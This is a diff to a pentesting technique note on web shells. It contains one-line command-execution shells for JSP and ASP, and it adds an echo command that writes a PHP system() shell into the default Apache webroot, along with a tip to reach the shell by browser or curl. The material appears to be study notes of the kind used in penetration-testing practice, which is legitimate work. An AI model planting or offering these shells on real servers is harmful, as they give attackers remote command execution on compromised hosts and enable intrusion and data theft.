@@ -31,16 +31,20 @@ tags: [technique, other]
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
-For `asp`
+#### For `asp`
 ```asp
 <% eval request("cmd") %>
 ```
 
-#### 
+#### For writing to webroots using `echo`
+```bash
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+```
 
 ## Things to know
 - Shell needs to be uploaded for example through a `shell.php` file on the remote host's web directory (webroot)
 - Can check directories for see which webroot is used and use `echo` to write the web shell
+- Once shell is uploaded it can be accessed via browser or through curl
 
 ## Default webroots
 |Web Server|Default Webroot|
